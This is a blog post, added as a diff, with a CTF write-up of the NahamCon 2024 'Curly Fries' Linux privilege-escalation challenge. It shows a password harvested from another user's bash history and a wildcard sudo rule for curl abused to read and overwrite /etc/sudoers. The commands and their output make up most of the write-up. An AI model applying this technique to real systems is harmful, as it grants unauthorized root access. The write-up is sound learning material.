@@ -1,0 +1,135 @@
+---
+title: NahamCon CTF 2024 - Curly Fries
+description: じゃがりこは近いかな　これしか持ってないから
+tags: [ "ctf", "ctf:misc" ]
+pubDate: '2025-03-27T17:54:21Z'
+cover: header.png
+---
+
+import { Image } from 'astro:assets';
+import challenge from './challenge.png';
+
+*Moving all of my past CTF write-ups to this website...*
+
+
+## Challenge
+<Image src={challenge} alt="challenge featuring ssh login" />
+
+While this challenge was probably child's play for those more experienced,
+I found it rather amusing and fun, hence the simple writeup!
+I have never tried privilege escalation on Linux, so these few challenges have been really enlightening.
+Here, we're given access to an unprivileged user via SSH, and we need to run some program in the root user's home.
+As expected, we don't have access to that directory.
+
+## Analysis
+```
+user@curlyfries:~$ ls -la /
+...
+drwx------    1 root     root          4096 May 24 16:39 root
+```
+
+First, I personally like to see what users are on the machine.
+
+```
+user@curlyfries:~$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/ash
+user:x:1000:1000:Linux User,,,:/home/user:/home/user/.user-entrypoint.sh
+fry:x:1001:1001:Linux User,,,:/home/fry:/bin/bash
+```
+
+Let's see what `fry` has up his sleeve.
+
+```
+user@curlyfries:~$ ls -la /home/fry
+total 24
+drwxr-sr-x    1 fry      fry           4096 May 24 16:39 .
+drwxr-xr-x    1 root     root          4096 May 24 16:39 ..
+-rw-r--r--    1 fry      fry            118 May 24 16:39 .bash_history
+-rwxr-xr-x    1 fry      fry           3850 May 24 16:39 .bashrc
+-rw-r--r--    1 fry      fry             17 May 24 16:39 .profile
+```
+
+Oh look, some history!
+
+```
+user@curlyfries:~$ cat /home/fry/.bash_history
+pwd
+whoami
+cd /tmp
+date
+sshpas
+sshpass
+sshpass -p iLoveCurlyFriesYumYumInMyTumTum ssh fry@localhost
+sl
+ls
+ls -la
+exit
+```
+
+So we got the account's password that we can `ssh` into.
+
+One thing I learned from the challenges this CTF is the power of `sudo -l`,
+showing what sudo commands can be run by the user.
+
+```
+fry@curlyfries:~$ sudo -l
+User fry may run the following commands on curly-fries-e7b3c9edfada5ee9-7b8b9c5444-sj76c:
+    (root) NOPASSWD: /usr/bin/curl 127.0.0.1\:8000/health-check*
+```
+
+Even without knowing the root password, we can run run `curl` as long as it starts with the above parameters.
+Taking a look at the help text, we it doesn't look like we can execute stuff,
+so we need to do a little bit more after some magical invocation of `curl` to get the flag.
+With some random experimentation, I learned that curl allows dealing with multiple urls and ouputs,
+which is just what we need, since we have an uncontrollable url that will serve us no purpose.
+
+## Exploit
+In order to be able to execute programs other than special invocations of `curl` as root,
+we can try modifying `/etc/sudoers` via `curl` and its output parameter.
+Since I'm curious about what the file looks like, let's first grab a copy.
+
+```
+fry@curlyfries:~$ sudo curl 127.0.0.1\:8000/health-check -o noop --url file:///etc/sudoers -o /home/fry/orig
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (7) Failed to connect to 127.0.0.1 port 8000: Connection refused
+100  3311  100  3311    0     0  3233k      0 --:--:-- --:--:-- --:--:-- 3233k
+
+fry@curlyfries:~$ tail -n 10 orig
+## Uncomment to allow any user to run sudo if they know the password
+## of the user they are running the command as (root by default).
+# Defaults targetpw  # Ask for the password of the target user
+# ALL ALL=(ALL) ALL  # WARNING: only use this together with 'Defaults targetpw'
+
+## Read drop-in files from /etc/sudoers.d
+## (the '#' here does not indicate a comment)
+#includedir /etc/sudoers.d
+user ALL=(fry) NOPASSWD: /usr/bin/curl 127.0.0.1\:8000/health-check
+fry ALL=(root) NOPASSWD: /usr/bin/curl 127.0.0.1\:8000/health-check*
+```
+
+Seems normal! Since this file isn't writable by our less-privileged user, let's copy it, modify it, and place it back where it belongs.
+
+```
+fry@curlyfries:~$ cp orig fries
+fry@curlyfries:~$ echo "ALL ALL=(root) NOPASSWD: ALL" >> fries
+fry@curlyfries:~$ sudo curl 127.0.0.1\:8000/health-check -o noop --url file:///home/fry/fries -o /etc/sudoers
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (7) Failed to connect to 127.0.0.1 port 8000: Connection refused
+100  3340  100  3340    0     0  3261k      0 --:--:-- --:--:-- --:--:-- 3261k
+fry@curlyfries:~$ sudo su
+root@curlyfries:/home/fry#
+```
+
+Guess who's got root! 💪 Let's grab our flag!
+
+```
+root@curlyfries:/home/fry# ls /root
+get_flag_random_suffix_1765252717274
+root@curlyfries:/home/fry# /root/get_flag_random_suffix_1765252717274
+Please press Enter within one second to retrieve the flag.
+
+flag{36fa4a94c4c3806b19c496a31859eff0}
+root@curlyfries:/home/fry#
+```
